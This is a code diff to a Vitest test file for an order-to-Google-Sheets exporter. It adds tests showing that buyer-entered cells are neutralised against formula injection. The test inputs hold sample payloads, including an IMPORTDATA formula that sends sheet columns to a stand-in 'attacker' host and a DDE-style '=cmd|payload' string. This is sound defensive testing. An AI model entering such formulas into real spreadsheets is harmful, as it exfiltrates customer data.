@@ -1,5 +1,5 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
-import { buildSheetRow, type OrderRowInput } from "@/lib/sheets";
+import { buildSheetRow, sanitizeCell, type OrderRowInput } from "@/lib/sheets";
 
 // Short-circuit the service-account JWT so the test exercises only the append
 // request shape, not the credential flow. Mirrors sheets-read.test.ts.
@@ -54,6 +54,52 @@ describe("buildSheetRow", () => {
     const row = buildSheetRow({ ...base, shipping: { showFee: false, shippingCentavos: 0, free: true } });
     expect(row[12]).toBe("FREE");
   });
+
+  it("neutralizes formula-injection in buyer-controlled cells with a leading apostrophe", () => {
+    const row = buildSheetRow({
+      ...base,
+      name: '=IMPORTDATA("https://attacker/?d="&A:Q)',
+      province: "+639-evil",
+      city: "-2 City",
+      barangay: "@SUM(A1)",
+      street: "\t=cmd|payload",
+      landmark: "\r=HYPERLINK()",
+      notes: "=WEBSERVICE()",
+    });
+    expect(row[2]).toBe('\'=IMPORTDATA("https://attacker/?d="&A:Q)'); // Name
+    expect(row[5]).toBe("'+639-evil"); // Province
+    expect(row[6]).toBe("'-2 City"); // City
+    expect(row[7]).toBe("'@SUM(A1)"); // Barangay
+    expect(row[8]).toBe("'\t=cmd|payload"); // Street (leading tab)
+    expect(row[9]).toBe("'\r=HYPERLINK()"); // Landmark (leading CR)
+    expect(row[13]).toBe("'=WEBSERVICE()"); // Notes
+  });
+
+  it("leaves benign buyer text and server-generated cells untouched", () => {
+    const row = buildSheetRow(base);
+    expect(row[2]).toBe("Juan"); // Name
+    expect(row[5]).toBe("Metro Manila"); // Province
+    expect(row[8]).toBe("123 Main St"); // Street
+    expect(row[9]).toBe("Near plaza"); // Landmark
+    expect(row[13]).toBe("Leave at gate"); // Notes
+    expect(row[0]).toBe("NAG-20260521-A7K1"); // Order# (server-generated)
+    expect(row[3]).toBe("+639171234567"); // Phone (server-normalized, not sanitized)
+  });
+});
+
+describe("sanitizeCell", () => {
+  it.each(["=", "+", "-", "@", "\t", "\r", "\n"])(
+    "prefixes an apostrophe when the value starts with %j",
+    (ch) => {
+      expect(sanitizeCell(`${ch}danger`)).toBe(`'${ch}danger`);
+    }
+  );
+  it("passes benign values through unchanged", () => {
+    expect(sanitizeCell("Juan dela Cruz")).toBe("Juan dela Cruz");
+    expect(sanitizeCell("123 Rizal St.")).toBe("123 Rizal St.");
+    expect(sanitizeCell("")).toBe("");
+    expect(sanitizeCell("price is 5-10 pesos")).toBe("price is 5-10 pesos"); // trigger char not leading
+  });
 });
 
 describe("appendOrderRow — formula/CSV injection guard", () => {
@@ -92,8 +138,9 @@ describe("appendOrderRow — formula/CSV injection guard", () => {
     // The injection-prone mode must be gone and stay gone.
     expect(url).toContain("valueInputOption=RAW");
     expect(url).not.toContain("USER_ENTERED");
-    // The payload is still sent verbatim — RAW stores it as inert text, not a formula.
+    // Defense-in-depth: buildSheetRow neutralizes the payload with a leading
+    // apostrophe BEFORE append, so the exported CSV/XLSX can never re-arm it.
     const body = JSON.parse((fetchMock.mock.calls[0][1] as RequestInit).body as string);
-    expect(body.values[0][2]).toBe('=IMPORTDATA("https://attacker/?d="&A:Q)');
+    expect(body.values[0][2]).toBe('\'=IMPORTDATA("https://attacker/?d="&A:Q)');
   });
 });
